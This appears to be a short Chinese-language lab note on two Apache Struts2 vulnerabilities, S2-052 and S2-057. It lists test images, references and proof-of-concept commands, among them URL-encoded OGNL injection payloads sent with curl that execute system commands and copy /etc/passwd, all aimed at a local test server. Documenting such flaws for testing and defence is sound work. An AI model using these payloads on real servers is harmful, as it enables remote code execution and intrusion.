## S2-052 xtream 反序列化漏洞

测试镜像

* src/struts/2.5.12/

Poc

```
python s2-052.py -u http://127.0.0.1:8080/struts2-rest-showcase/orders/3 -c whoami
```

## S2-057 struts namespace OGNL 代码执行漏洞

说明

* namespace 里可以出现 `/`，无需编码

测试镜像

* src/struts/2.3.20

参考资料

* [St2-057 Poc Example](https://github.com/jas502n/St2-057)
* [【Struts2-代码执行漏洞分析系列】S2-057](https://xz.aliyun.com/t/2618)

Poc

```
// Runtime.exec
curl 'http://127.0.0.1/struts2-showcase/%24%7b(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40java.lang.Runtime%40getRuntime().exec(%27cp%20/etc/passwd%20/tmp%27))%7d/actionChain1.action'

// ProcessBuilder.start
curl 'http://127.0.0.1/struts2-showcase/%24%7b(%23_memberAccess=%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23cmd=%7B%27/bin/bash%27,%27-c%27,%27cp%20/etc/hosts%20/tmp%27%7D,%23p=new%20java.lang.ProcessBuilder(%23cmd),%23p.start())%7d/actionChain1.action'

ls -lah /tmp/passwd
```

